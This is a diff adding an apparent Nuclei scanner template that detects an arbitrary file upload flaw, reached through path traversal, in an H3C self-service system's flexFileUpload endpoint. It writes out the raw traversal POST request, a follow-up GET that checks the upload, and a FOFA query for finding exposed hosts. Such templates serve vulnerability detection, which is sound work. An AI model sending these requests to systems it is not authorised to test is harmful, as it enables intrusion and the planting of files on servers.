@@ -1,0 +1,49 @@
+id: flexfileupload-path-traversal
+
+info:
+  name: FlexFileUpload Path Traversal
+  author: ProjectDiscoveryAI,dostghost
+  severity: high
+  description: |
+    Exploits a path traversal vulnerability in the FlexFileUpload endpoint to upload a file and verifies the upload by attempting to access the file. fofa搜索很难再找到对应资产
+  reference:
+    - https://github.com/AboSteam/POPC/blob/main/H3C-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Fflexfileupload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: header="/selfservice"
+  tags: path-traversal, file-upload,intrusive
+
+http:
+  - raw:
+      - |
+        POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q
+        Connection: close
+        Content-Length: 243
+
+        -----------------WebKitFormBoundaryMmx988TUuintqO4Q
+        Content-Disposition: form-data; name="123.txt"; filename="123.txt"
+        Content-Type: application/octet-stream
+
+        1111
+        -----------------WebKitFormBoundaryMmx988TUuintqO4Q--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /imc/primepush/%2e%2e/flex/topobg/123.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "1111"
